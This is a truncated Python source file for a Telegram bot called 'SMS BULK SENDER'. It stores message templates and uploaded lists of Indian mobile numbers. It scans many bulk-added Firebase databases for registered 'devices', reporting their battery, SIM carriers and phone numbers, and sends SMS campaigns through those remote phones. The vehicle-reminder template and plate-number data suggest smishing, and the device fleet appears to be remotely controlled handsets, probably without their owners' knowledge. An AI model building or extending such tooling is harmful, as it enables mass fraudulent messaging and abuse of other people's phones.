import logging
import asyncio
import re
import csv
import io
import json
import math
import time
from datetime import datetime
from typing import List, Dict, Any, Optional

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters,
)

import config
from firebase_manager import FirebaseManager
from database import Database

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

db = Database(config.DB_PATH)

ACTIVE_CAMPAIGNS: Dict[str, dict] = {}

# User input states
ST_IDLE = 'idle'
ST_TPL_NAME = 'tpl_name'
ST_TPL_MSG = 'tpl_msg'
ST_TPL_EDIT_MSG = 'tpl_edit_msg'
ST_DF_UPLOAD = 'df_upload'
ST_FB_URL = 'fb_url'
ST_FB_BULK = 'fb_bulk'
ST_CAMP_UPLOAD = 'camp_upload'


# ============================================================
# AUTH
# ============================================================

def is_authorized(user_id: int) -> bool:
    if not config.AUTHORIZED_USERS:
        return True
    return user_id in config.AUTHORIZED_USERS or user_id in config.ADMIN_IDS

def is_admin(user_id: int) -> bool:
    return user_id in config.ADMIN_IDS


# ============================================================
# UTILITIES
# ============================================================

def progress_bar(done: int, total: int, length: int = 15) -> str:
    if total <= 0:
        return "░" * length + " 0%"
    pct = done / total
    filled = int(round(length * pct))
    bar = "█" * filled + "░" * (length - filled)
    return f"`[{bar}]` {int(pct * 100)}%"

def extract_variables(msg: str) -> List[str]:
    return re.findall(r'\{(\w+)\}', msg)

def generate_message(template: str, row: dict) -> str:
    msg = template
    for key, val in row.items():
        msg = msg.replace(f'{{{key}}}', str(val))
    return msg

def sanitize_phone(raw: str) -> Optional[str]:
    cleaned = re.sub(r'[\s\-\(\)]', '', raw.strip())
    if not cleaned:
        return None
    if len(cleaned) == 10 and cleaned.isdigit():
        return f"+91{cleaned}"
    if len(cleaned) == 12 and cleaned.startswith("91") and cleaned.isdigit():
        return f"+{cleaned}"
    if cleaned.startswith("+") and cleaned[1:].isdigit() and len(cleaned) >= 11:
        return cleaned
    if cleaned.isdigit() and len(cleaned) >= 10:
        return f"+{cleaned}"
    return None

def parse_csv_content(content: str, filename: str) -> dict:
    """Parse CSV/TXT content, validate rows, return stats + clean data."""
    result = {
        'filename': filename, 'columns': [], 'total': 0,
        'valid': 0, 'invalid': 0, 'duplicate': 0,
        'data': [], 'errors': []
    }
    try:
        # Detect delimiter
        sample = content[:2000]
        delimiter = ','
        if '\t' in sample and sample.count('\t') > sample.count(','):
            delimiter = '\t'
        elif ';' in sample and sample.count(';') > sample.count(','):
            delimiter = ';'

        reader = csv.DictReader(io.StringIO(content), delimiter=delimiter)
        if not reader.fieldnames:
            result['errors'].append("No headers found")
            return result

        columns = [c.strip().upper() for c in reader.fieldnames]
        result['columns'] = columns

        if 'MOBILE' not in columns:
            result['errors'].append("Missing required MOBILE column")
            return result

        seen_mobiles = set()
        valid_rows = []
        total = 0
        invalid = 0
        duplicate = 0

        for row_num, row in enumerate(reader, 2):
            total += 1
            normalized = {}
            for k, v in row.items():
                if k:
                    normalized[k.strip().upper()] = (v or '').strip()

            mobile_raw = normalized.get('MOBILE', '')
            phone = sanitize_phone(mobile_raw)

            if not phone:
                invalid += 1
                continue

            if phone in seen_mobiles:
                duplicate += 1
                continue

            seen_mobiles.add(phone)
            normalized['MOBILE'] = phone
            valid_rows.append(normalized)

        result['total'] = total
        result['valid'] = len(valid_rows)
        result['invalid'] = invalid
        result['duplicate'] = duplicate
        result['data'] = valid_rows

    except Exception as e:
        result['errors'].append(str(e))

    return result

def get_active_fb(user_id: int) -> Optional[FirebaseManager]:
    fb_config = db.get_active_firebase(user_id)
    if fb_config:
        return FirebaseManager(fb_config['url'])
    # Fallback: try any firebase the user has
    configs = db.get_firebase_configs(user_id)
    if configs:
        return FirebaseManager(configs[0]['url'])
    return None

def has_any_firebase(user_id: int) -> bool:
    configs = db.get_firebase_configs(user_id)
    return len(configs) > 0

def get_all_online_devices(user_id: int) -> tuple:
    """Scan ALL user's Firebases, aggregate online devices.
    Each device gets fb_url/fb_name so SMS goes to correct Firebase.
    Returns (online_devices_list, total_clients_count, per_fb_stats)
    """
    configs = db.get_firebase_configs(user_id)
    all_online = []
    total_clients = 0
    fb_stats = []

    for fc in configs:
        try:
            fb = FirebaseManager(fc['url'])
            clients = fb.get_all_clients()
            online = fb.get_online_devices()
            total_clients += len(clients)

            for dev in online:
                dev['fb_url'] = fc['url']
                dev['fb_id'] = fc['id']
                dev['fb_name'] = fc['name']

            all_online.extend(online)
            fb_stats.append({
                'name': fc['name'],
                'total': len(clients),
                'online': len(online),
                'offline': max(0, len(clients) - len(online)),
            })
        except Exception as e:
            logger.error(f"Error scanning Firebase {fc['name']}: {e}")
            fb_stats.append({'name': fc['name'], 'total': 0, 'online': 0, 'offline': 0, 'error': str(e)})

    return all_online, total_clients, fb_stats

def make_campaign_id(user_id: int) -> str:
    now = datetime.now().strftime("%Y%m%d")
    num = db.get_next_campaign_number(user_id)
    return f"{config.CAMPAIGN_PREFIX}-{now}-{num:03d}"

def set_state(context, state: str, **kwargs):
    context.user_data['state'] = state
    for k, v in kwargs.items():
        context.user_data[k] = v

def clear_state(context):
    context.user_data['state'] = ST_IDLE

def fmt_time(seconds: float) -> str:
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    if h > 0:
        return f"{h}:{m:02d}:{s:02d}"
    return f"{m}:{s:02d}"


# ============================================================
# /start & MAIN MENU
# ============================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id):
        text = "❌ *Access Denied*\n\nYou are not authorized to use this bot."
        if update.message:
            await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
        return
    clear_state(context)
    await _show_main_menu(update, context)

async def _show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    fb_count = len(db.get_firebase_configs(user.id))
    camp_count = db.get_campaign_count(user.id) if hasattr(db, 'get_campaign_count') else 0
    tpl_count = len(db.get_user_templates(user.id)) if hasattr(db, 'get_user_templates') else 0
    active = len(ACTIVE_CAMPAIGNS)

    text = (
        f"⚡ *SMS BULK SENDER*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Hey *{user.first_name}*, what's the move?\n\n"
    )
    if active > 0:
        text += f"🔴 *{active} campaign(s) running*\n\n"
    text += (
        f"🔥 `{fb_count}` Firebase | "
        f"📝 `{tpl_count}` Template\n"
    )

    kb = [
        [InlineKeyboardButton("🚀 Start Campaign", callback_data="menu_campaign")],
        [
            InlineKeyboardButton("📱 Devices", callback_data="menu_devices"),
            InlineKeyboardButton("📝 Templates", callback_data="menu_templates"),
        ],
        [
            InlineKeyboardButton("📁 Data Files", callback_data="menu_datafiles"),
            InlineKeyboardButton("🔥 Firebase", callback_data="menu_firebase"),
        ],
        [
            InlineKeyboardButton("📊 Dashboard", callback_data="menu_dashboard"),
            InlineKeyboardButton("📜 History", callback_data="menu_history"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
            InlineKeyboardButton("❓ Help", callback_data="menu_help"),
        ],
    ]
    if is_admin(update.effective_user.id):
        kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="menu_admin")])

    markup = InlineKeyboardMarkup(kb)
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)


# ============================================================
# 📱 DEVICES
# ============================================================

async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not has_any_firebase(user_id):
        return await _no_firebase(update)

    if update.callback_query:
        await update.callback_query.edit_message_text("🔄 *Scanning all Firebases for devices...*", parse_mode=ParseMode.MARKDOWN)
        msg = update.callback_query.message
    else:
        msg = await update.message.reply_text("🔄 *Scanning all Firebases for devices...*", parse_mode=ParseMode.MARKDOWN)

    online_devices, total_clients, fb_stats = await asyncio.to_thread(get_all_online_devices, user_id)
    online = len(online_devices)
    offline = max(0, total_clients - online)

    text = (
        f"📱 *Device Overview (All Firebases)*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Online: `{online}`\n"
        f"🔴 Offline: `{offline}`\n"
        f"📊 Total Registered: `{total_clients}`\n"
        f"🔥 Firebases Scanned: `{len(fb_stats)}`\n\n"
    )

    # Per-firebase breakdown
    if fb_stats:
        text += "*Per Firebase:*\n"
        for fs in fb_stats:
            err = fs.get('error')
            if err:
                text += f"  ❌ {fs['name']} — Error\n"
            else:
                text += f"  🔥 {fs['name']} — 🟢{fs['online']} / 🔴{fs['offline']} / 📊{fs['total']}\n"
        text += "\n"

    if online_devices:
        text += "*Online Devices:*\n"
        for idx, dev in enumerate(online_devices, 1):
            sim_parts = []
            for s in dev['sims']:
                carrier = s.get('carrier', 'N/A')
                phone = s.get('phone', '')
                slot = s.get('slot', '0')
                if phone and phone != 'Unknown':
                    sim_parts.append(f"Slot {slot}: {carrier} ({phone})")
                else:
                    sim_parts.append(f"Slot {slot}: {carrier}")
            sim_str = " | ".join(sim_parts) if sim_parts else "No SIM"
            fb_label = dev.get('fb_name', '?')
            text += (
                f"\n{idx}. *{dev['model']}* _{fb_label}_\n"
                f"   ID: `{dev['id'][:12]}...`\n"
                f"   🔋 {dev['battery']} | 📶 {sim_str}\n"
            )
    else:
        text += "⚠️ *No devices online across any Firebase!*\n"

    kb = [
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="menu_devices"),
            InlineKeyboardButton("🚀 Start Campaign", callback_data="menu_campaign"),
        ],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


# ============================================================
# 📝 TEMPLATES
# ============================================================

async def show_templates(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    templates = db.get_templates(user_id)
    text = "📝 *Message Templates*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"

    kb = []
    if templates:
        for t in templates:
            vars_list = json.loads(t.get('variables', '[]'))
            vars_str = ", ".join(vars_list) if vars_list else "None"
            text += f"📄 *{t['name']}* — {t['char_count']} chars | Vars: {vars_str}\n"
            kb.append([InlineKeyboardButton(f"📄 {t['name']}", callback_data=f"tpl_view_{t['id']}")])
    else:
        text += "No templates yet. Create one!\n"

    kb.append([InlineKeyboardButton("➕ Create Template", callback_data="tpl_create")])
    kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")])

    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def template_create(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_state(context, ST_TPL_NAME)
    text = "📝 *Create New Template*\n\nEnter the template name:"
    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_template_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text.strip()
    if not name:
        await update.message.reply_text("⚠️ Name cannot be empty. Enter template name:")
        return
    context.user_data['tpl_name_val'] = name
    set_state(context, ST_TPL_MSG)
    await update.message.reply_text(
        f"✅ Template name: *{name}*\n\n"
        f"Now enter the message text.\n"
        f"Use `{{VARIABLE}}` for dynamic fields.\n\n"
        f"Example:\n`Hello {{VEHICLE}}, this is a reminder regarding your vehicle.`",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_template_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text.strip()
    if not msg_text:
        await update.message.reply_text("⚠️ Message cannot be empty. Enter message text:")
        return

    name = context.user_data.get('tpl_name_val', 'Untitled')
    variables = extract_variables(msg_text)
    char_count = len(msg_text)
    sms_parts = math.ceil(char_count / 160) if char_count > 0 else 1

    tid = db.create_template(update.effective_user.id, name, msg_text, variables)
    clear_state(context)

    vars_str = ", ".join([f"`{{{v}}}`" for v in variables]) if variables else "None"
    text = (
        f"✅ *Template Created!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 *Name:* {name}\n"
        f"📊 *Length:* `{char_count}` chars (~{sms_parts} SMS)\n"
        f"🔗 *Variables:* {vars_str}\n\n"
        f"💬 *Preview:*\n`{msg_text[:200]}`"
    )
    kb = [
        [InlineKeyboardButton("📝 Templates List", callback_data="menu_templates")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def template_view(update: Update, context: ContextTypes.DEFAULT_TYPE, tid: int):
    t = db.get_template(tid)
    if not t:
        await update.callback_query.edit_message_text("❌ Template not found.")
        return
    variables = json.loads(t.get('variables', '[]'))
    vars_str = ", ".join([f"`{{{v}}}`" for v in variables]) if variables else "None"
    sms_parts = math.ceil(t['char_count'] / 160) if t['char_count'] > 0 else 1

    text = (
        f"📄 *{t['name']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Length: `{t['char_count']}` chars (~{sms_parts} SMS)\n"
        f"🔗 Variables: {vars_str}\n"
        f"📅 Created: `{t['created_at']}`\n\n"
        f"💬 *Message:*\n`{t['message']}`"
    )
    kb = [
        [
            InlineKeyboardButton("✏️ Edit", callback_data=f"tpl_edit_{tid}"),
            InlineKeyboardButton("🗑 Delete", callback_data=f"tpl_del_{tid}"),
        ],
        [InlineKeyboardButton("📝 Templates List", callback_data="menu_templates")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def template_edit_start(update: Update, context: ContextTypes.DEFAULT_TYPE, tid: int):
    set_state(context, ST_TPL_EDIT_MSG, edit_tpl_id=tid)
    await update.callback_query.edit_message_text(
        "✏️ *Edit Template*\n\nSend the new message text:",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_template_edit_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text.strip()
    if not msg_text:
        await update.message.reply_text("⚠️ Message cannot be empty.")
        return
    tid = context.user_data.get('edit_tpl_id')
    if not tid:
        clear_state(context)
        return
    variables = extract_variables(msg_text)
    db.update_template(tid, message=msg_text, variables=variables)
    clear_state(context)
    await update.message.reply_text(
        "✅ *Template Updated!*",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📄 View Template", callback_data=f"tpl_view_{tid}")],
            [InlineKeyboardButton("📝 Templates List", callback_data="menu_templates")],
        ]),
        parse_mode=ParseMode.MARKDOWN
    )

async def template_delete_ask(update: Update, context: ContextTypes.DEFAULT_TYPE, tid: int):
    t = db.get_template(tid)
    name = t['name'] if t else 'Unknown'
    text = f"🗑 *Delete template '{name}'?*\n\nThis action cannot be undone."
    kb = [
        [
            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"tpl_delok_{tid}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"tpl_view_{tid}"),
        ]
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def template_delete_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, tid: int):
    db.delete_template(tid)
    await update.callback_query.edit_message_text(
        "✅ *Template deleted.*",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📝 Templates", callback_data="menu_templates")]]),
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# 📁 DATA FILES
# ============================================================

async def show_data_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    files = db.get_data_files(user_id)
    text = "📁 *Data Files*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"

    kb = []
    if files:
        for f in files:
            text += f"📄 *{f['filename']}* — {f['valid_rows']} valid records\n"
            kb.append([InlineKeyboardButton(f"📄 {f['filename']}", callback_data=f"df_view_{f['id']}")])
    else:
        text += "No data files uploaded yet.\n"

    kb.append([InlineKeyboardButton("📤 Upload New File", callback_data="df_upload")])
    kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def data_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_state(context, ST_DF_UPLOAD)
    text = (
        "📤 *Upload Data File*\n\n"
        "Send a CSV or TXT file with your data.\n\n"
        "Required columns: `MOBILE`\n"
        "Optional: `VEHICLE`, `NAME`, or any custom field.\n\n"
        "Example CSV format:\n"
        "`VEHICLE,MOBILE`\n"
        "`DL01AB1234,9876543210`\n"
        "`DL02CD5678,9123456780`"
    )
    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state', ST_IDLE)
    doc = update.message.document

    if not doc:
        await update.message.reply_text("⚠️ Please upload a CSV or TXT file.")
        return

    if not doc.file_name.lower().endswith(('.csv', '.txt')):
        await update.message.reply_text("⚠️ Only `.csv` or `.txt` files are supported.")
        return

    status_msg = await update.message.reply_text("⏳ *Processing file...*", parse_mode=ParseMode.MARKDOWN)

    file = await doc.get_file()
    file_bytes = await file.download_as_bytearray()
    try:
        content = file_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        await status_msg.edit_text(f"❌ Error reading file: {e}")
        return

    result = parse_csv_content(content, doc.file_name)

    if result['errors']:
        await status_msg.edit_text(
            f"❌ *File Error*\n\n" + "\n".join(result['errors']),
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # Store in user_data temporarily
    context.user_data['pending_file'] = result

    text = (
        f"📊 *FILE ANALYSIS*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 File: `{result['filename']}`\n"
        f"📋 Columns: `{', '.join(result['columns'])}`\n\n"
        f"📊 Total Rows: `{result['total']}`\n"
        f"✅ Valid: `{result['valid']}`\n"
        f"❌ Invalid: `{result['invalid']}`\n"
        f"🔄 Duplicate: `{result['duplicate']}`\n"
    )

    if result['data']:
        sample = result['data'][0]
        text += f"\n*Sample Record:*\n"
        for k, v in sample.items():
            text += f"  {k}: `{v}`\n"

    if state == ST_CAMP_UPLOAD:
        # During campaign wizard — save directly and continue
        fid = db.save_data_file(
            update.effective_user.id, result['filename'], result['columns'],
            result['total'], result['valid'], result['invalid'],
            result['duplicate'], result['data']
        )
        context.user_data.setdefault('campaign', {})['data_file_id'] = fid
        context.user_data['campaign']['data'] = result['data']
        context.user_data['campaign']['columns'] = result['columns']
        context.user_data['campaign']['step'] = 2
        clear_state(context)

        text += f"\n✅ *File saved!*\nTotal Valid Records: `{result['valid']}`"
        kb = [
            [InlineKeyboardButton("➡️ Continue — Select Template", callback_data="camp_continue")],
            [InlineKeyboardButton("❌ Cancel Campaign", callback_data="camp_cancel")],
        ]
    else:
        kb = [
            [
                InlineKeyboardButton("👁 Preview", callback_data="df_preview_temp"),
                InlineKeyboardButton("💾 Save", callback_data="df_save"),
            ],
            [InlineKeyboardButton("🗑 Discard", callback_data="df_discard")],
        ]

    await status_msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def data_file_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = context.user_data.get('pending_file')
    if not result:
        await update.callback_query.edit_message_text("❌ No pending file to save.")
        return

    fid = db.save_data_file(
        update.effective_user.id, result['filename'], result['columns'],
        result['total'], result['valid'], result['invalid'],
        result['duplicate'], result['data']
    )
    context.user_data.pop('pending_file', None)
    clear_state(context)

    await update.callback_query.edit_message_text(
        f"✅ *File Saved!*\n`{result['filename']}` — {result['valid']} valid records",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📁 Data Files", callback_data="menu_datafiles")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
        ]),
        parse_mode=ParseMode.MARKDOWN
    )

async def data_file_discard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop('pending_file', None)
    clear_state(context)
    await update.callback_query.edit_message_text(
        "🗑 *File discarded.*",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📁 Data Files", callback_data="menu_datafiles")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
        ]),
        parse_mode=ParseMode.MARKDOWN
    )

async def data_file_view(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    f = db.get_data_file(fid)
    if not f:
        await update.callback_query.edit_message_text("❌ File not found.")
        return
    cols = f.get('columns', [])
    text = (
        f"📄 *{f['filename']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Columns: `{', '.join(cols)}`\n"
        f"📊 Total: `{f['total_rows']}` | Valid: `{f['valid_rows']}` | Invalid: `{f['invalid_rows']}` | Dup: `{f['duplicate_rows']}`\n"
        f"📅 Uploaded: `{f['created_at']}`\n"
    )
    if f.get('data') and len(f['data']) > 0:
        text += f"\n*Sample:*\n"
        sample = f['data'][0]
        for k, v in sample.items():
            text += f"  {k}: `{v}`\n"

    kb = [
        [InlineKeyboardButton("🗑 Delete", callback_data=f"df_del_{fid}")],
        [InlineKeyboardButton("📁 Data Files", callback_data="menu_datafiles")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def data_file_delete_ask(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    text = "🗑 *Delete this data file?*\n\nThis cannot be undone."
    kb = [
        [
            InlineKeyboardButton("✅ Yes", callback_data=f"df_delok_{fid}"),
            InlineKeyboardButton("❌ No", callback_data=f"df_view_{fid}"),
        ]
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def data_file_delete_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    db.delete_data_file(fid)
    await update.callback_query.edit_message_text(
        "✅ *File deleted.*",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📁 Data Files", callback_data="menu_datafiles")]]),
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# 🔥 FIREBASE
# ============================================================

async def show_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    configs = db.get_firebase_configs(user_id)
    text = "🔥 *Firebase Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"

    kb = []
    if configs:
        for fc in configs:
            status = "🟢 Active" if fc['is_active'] else "⚪"
            text += f"{status} *{fc['name']}*\n   `{fc['url'][:50]}...`\n\n"
            kb.append([InlineKeyboardButton(
                f"{'✅ ' if fc['is_active'] else ''}{fc['name']}",
                callback_data=f"fb_view_{fc['id']}"
            )])
    else:
        text += "No Firebase configured. Add one to get started!\n"

    kb.append([
        InlineKeyboardButton("➕ Add Firebase", callback_data="fb_add"),
        InlineKeyboardButton("📋 Bulk Add", callback_data="fb_bulk_add"),
    ])
    kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def firebase_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_state(context, ST_FB_URL)
    text = (
        "➕ *Add Firebase*\n\n"
        "Send your Firebase Realtime Database URL.\n\n"
        "Example:\n`https://your-project-default-rtdb.firebaseio.com`"
    )
    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith("http"):
        url = f"https://{url}"

    msg = await update.message.reply_text("⏳ *Testing connection...*", parse_mode=ParseMode.MARKDOWN)

    fb = FirebaseManager(url)
    if not await asyncio.to_thread(fb.test_connection):
        await msg.edit_text(
            "❌ *Connection failed!*\n\nCheck the URL and try again.\nSend the URL:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # Connection works — test device reading
    all_clients = await asyncio.to_thread(fb.get_all_clients)
    online = await asyncio.to_thread(fb.get_online_devices)
    name = url.split("//")[1].split(".")[0] if "//" in url else "Firebase"

    fid = db.add_firebase(update.effective_user.id, name, url)
    clear_state(context)

    text = (
        f"✅ *Firebase Connected!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 `{url[:60]}...`\n\n"
        f"📱 Total Devices: `{len(all_clients)}`\n"
        f"🟢 Online: `{len(online)}`\n"
        f"🔴 Offline: `{max(0, len(all_clients) - len(online))}`\n"
    )
    kb = [
        [InlineKeyboardButton("🔥 Firebase List", callback_data="menu_firebase")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
    ]
    await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def firebase_bulk_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_state(context, ST_FB_BULK)
    text = (
        "📋 *Bulk Add Firebase*\n\n"
        "Send multiple Firebase URLs — one per line.\n\n"
        "Example:\n"
        "`https://project1-rtdb.firebaseio.com`\n"
        "`https://project2-rtdb.asia-southeast1.firebasedatabase.app`\n"
        "`https://project3-rtdb.firebaseio.com`\n\n"
        "All valid URLs will be tested and added automatically."
    )
    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)


async def handle_firebase_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    raw = update.message.text.strip()

    # Parse URLs — split by newlines and/or commas
    lines = [u.strip().strip(',') for u in raw.replace(',', '\n').splitlines()]
    urls = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if not line.startswith('http'):
            line = f"https://{line}"
        urls.append(line)

    if not urls:
        await update.message.reply_text("❌ No valid URLs found. Send one URL per line.")
        return

    msg = await update.message.reply_text(
        f"⏳ *Testing {len(urls)} Firebase URL(s)...*",
        parse_mode=ParseMode.MARKDOWN
    )

    added = []
    failed = []

    async def _test_and_add(url: str):
        try:
            fb = FirebaseManager(url)
            ok = await asyncio.to_thread(fb.test_connection)
            if ok:
                name = url.split("//")[1].split(".")[0] if "//" in url else "Firebase"
                fid = db.add_firebase(user_id, name, url)
                clients = await asyncio.to_thread(fb.get_client_count)
                added.append((name, url, clients))
            else:
                failed.append(url)
        except Exception as e:
            logger.error(f"Bulk add error for {url}: {e}")
            failed.append(url)

    # Test all URLs concurrently
    await asyncio.gather(*[_test_and_add(u) for u in urls], return_exceptions=True)

    clear_state(context)

    text = f"📋 *Bulk Firebase Add — Done*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += f"✅ Added: `{len(added)}` | ❌ Failed: `{len(failed)}`\n\n"

    if added:
        text += "*✅ Successfully Added:*\n"
        for name, url, clients in added:
            text += f"  🔥 *{name}* — `{clients}` devices\n"
        text += "\n"

    if failed:
        text += "*❌ Failed (unreachable or invalid):*\n"
        for url in failed:
            short = url[8:50] if len(url) > 50 else url
            text += f"  ✗ `{short}`\n"

    kb = [
        [InlineKeyboardButton("🔥 Firebase List", callback_data="menu_firebase")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


async def firebase_view(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    fc = db.get_firebase_by_id(fid)
    if not fc:
        await update.callback_query.edit_message_text("❌ Not found.")
        return
    active_str = "🟢 Active" if fc['is_active'] else "⚪ Inactive"
    text = (
        f"🔥 *{fc['name']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 `{fc['url']}`\n"
        f"Status: {active_str}\n"
        f"📅 Added: `{fc['created_at']}`\n"
    )
    kb = [
        [InlineKeyboardButton("🔍 Test Connection", callback_data=f"fb_test_{fid}")],
    ]
    if not fc['is_active']:
        kb.append([InlineKeyboardButton("✅ Set as Active", callback_data=f"fb_select_{fid}")])
    kb.append([InlineKeyboardButton("🗑 Delete", callback_data=f"fb_del_{fid}")])
    kb.append([InlineKeyboardButton("🔥 Firebase List", callback_data="menu_firebase")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def firebase_test(update: Update, context: ContextTypes.DEFAULT_TYPE, fid: int):
    fc = db.get_firebase_by_id(fid)
    if not fc:
        return
    await update.callback_query.edit_message_text("🔄 *Testing connection...*", parse_mode=ParseMode.MARKDOWN)
    fb = FirebaseManager(fc['url'])
    if not await asyncio.to_thread(fb.test_connection):
        text = f"❌ *Connection Failed!*\n`{fc['url']}`"
    else:
        all_c = await asyncio.to_thread(fb.get_all_clients)
        online = await asyncio.to_thread(fb.get_online_devices)
        online_count = len(online)
        offline_count = max(0, len(all_c) - online_count)
        ready = online_count  # devices that are online
        text = (
            f"🟢 *Connection Successful!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Total Devices: `{len(all_c)}`\n"
            f"🟢 Online: `{online_count}`\n"
            f"🔴 Offline: `{offline_count}`\n"
            f"✅ Ready: `{ready}`\n"
        )
    kb = [
